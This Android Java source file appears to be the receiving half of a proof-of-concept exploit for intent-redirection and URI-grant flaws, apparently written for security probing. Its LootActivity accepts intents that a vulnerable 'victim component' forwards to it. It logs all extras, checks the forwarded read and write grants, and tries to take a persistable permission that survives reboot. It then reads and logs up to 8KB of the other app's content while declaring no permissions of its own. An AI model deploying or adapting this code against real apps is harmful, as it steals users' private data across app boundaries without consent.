package com.sanehunters.probe;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * Receives whatever a victim component forwards to us and records, as PROBE|loot|... lines, what the
 * forwarded grant lets this zero-permission app read. Read with:  adb logcat -s PROBE:V
 */
public class LootActivity extends Activity {
    private static final String TAG = "PROBE";

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent i = getIntent();
        Log.i(TAG, "PROBE|loot|reached=true|action=" + i.getAction() + "|data=" + i.getData() + "|flags=0x" + Integer.toHexString(i.getFlags()));
        if (i.getExtras() != null)
            for (String k : i.getExtras().keySet()) Log.i(TAG, "PROBE|loot|extra=" + k + "|value=" + String.valueOf(i.getExtras().get(k)));
        Uri granted = i.getData();
        if (granted != null) {
            boolean read  = (i.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION)  != 0;
            boolean write = (i.getFlags() & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) != 0;
            Log.i(TAG, "PROBE|loot|grant_read=" + read + "|grant_write=" + write);
            try {
                getContentResolver().takePersistableUriPermission(granted, Intent.FLAG_GRANT_READ_URI_PERMISSION);
                Log.i(TAG, "PROBE|loot|persistable=taken (survives reboot)");
            } catch (Throwable t) { Log.i(TAG, "PROBE|loot|persistable=no (" + t.getClass().getSimpleName() + ")"); }
            dump(granted);
        }
        finish();
    }

    private void dump(Uri u) {
        try (InputStream in = getContentResolver().openInputStream(u)) {
            if (in == null) { Log.i(TAG, "PROBE|loot|openInputStream=null"); return; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n, total = 0;
            while ((n = in.read(buf)) > 0 && total < 8192) { bo.write(buf, 0, n); total += n; }
            Log.i(TAG, "PROBE|loot|bytes=" + total + "|uri=" + u + " (READ via forwarded grant; declared permissions NONE)");
            Log.i(TAG, "PROBE|loot|head=" + bo.toString().replace('\n', ' '));
        } catch (Throwable t) {
            Log.i(TAG, "PROBE|loot|read_failed=" + t.getClass().getSimpleName() + ": " + t.getMessage());
        }
    }
}
